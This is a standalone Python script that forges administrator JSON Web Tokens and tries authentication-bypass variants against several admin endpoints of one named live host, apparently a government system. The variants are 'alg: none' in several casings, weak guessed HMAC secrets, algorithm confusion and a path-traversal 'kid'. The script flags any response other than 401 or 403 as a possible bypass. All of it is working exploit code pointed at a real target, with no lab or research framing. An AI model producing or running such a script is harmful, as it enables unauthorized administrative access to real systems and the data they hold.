import requests, urllib3, json, base64, time
urllib3.disable_warnings()
S = requests.Session(); S.verify=False
UA={"User-Agent":"Mozilla/5.0"}

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def make(header, payload, sig=b""):
    h=b64u(json.dumps(header,separators=(',',':')).encode())
    p=b64u(json.dumps(payload,separators=(',',':')).encode())
    return f"{h}.{p}.{b64u(sig) if sig else ''}"

now=int(time.time())
payload = {"user":{"account":"admin","role":"ADMIN","name":"Admin","id":1,"disabled":False},
           "permissions":["AUTH_USER","AUTH_ROLE","AUTH_PERM","AUTH_USER_ALL","AUTH_RESET_PASSWORD","AUTH_2FA"],
           "iat":now,"exp":now+3600,"nbf":now-10}
variants = {
 "alg_none_nosig": ({"alg":"none","typ":"JWT"}, payload, None),
 "alg_none_sig":   ({"alg":"none","typ":"JWT"}, payload, b"x"),
 "alg_HS256_garbage": ({"alg":"HS256","typ":"JWT"}, payload, b"A"*32),
 "alg_HS256_secret":  ({"alg":"HS256","typ":"JWT"}, payload, b"secret"),
 "alg_RS256_confuse": ({"alg":"RS256","typ":"JWT"}, payload, b"A"*100),
 "alg_HS256_weak":    ({"alg":"HS256","typ":"JWT"}, payload, b"123456"),
 "alg_None_cap":     ({"alg":"None","typ":"JWT"}, payload, None),
 "alg_nOnE_mix":     ({"alg":"nOnE","typ":"JWT"}, payload, None),
 "alg_HS512_secret":  ({"alg":"HS512","typ":"JWT"}, payload, b"secret"),
 "kid_sql":          ({"alg":"HS256","typ":"JWT","kid":"../../"}, payload, b"A"*32),
 "kid_null":         ({"alg":"HS256","typ":"JWT","kid":None}, payload, b"A"*32),
}

for path in ["/config","/Users","/Roles","/Permissions"]:
    print(f"\n===== {path} =====")
    for name,(hdr,pl,sig) in variants.items():
        tok = make(hdr,pl,sig)
        h=dict(UA); h["Authorization"]=f"Bearer {tok}"
        try:
            r=S.get("https://epcr.tpf.gov.tw:4004"+path, timeout=12, headers=h)
            ok = r.status_code not in (401,403)
            mark = "  <=== AUTH BYPASS?!" if ok else ""
            print(f"[{name:18}] {r.status_code} {r.headers.get('content-type','')[:24]:24} {r.text[:80]!r}{mark}")
        except Exception as e:
            print(f"[{name}] EXC {e}")
# also: no authz (missing Authorization) baseline
h=dict(UA)
r=S.get("https://epcr.tpf.gov.tw:4004/config", timeout=12, headers=h)
print(f"\n[no-token baseline] /config => {r.status_code} {r.text[:60]!r}")
print("done")
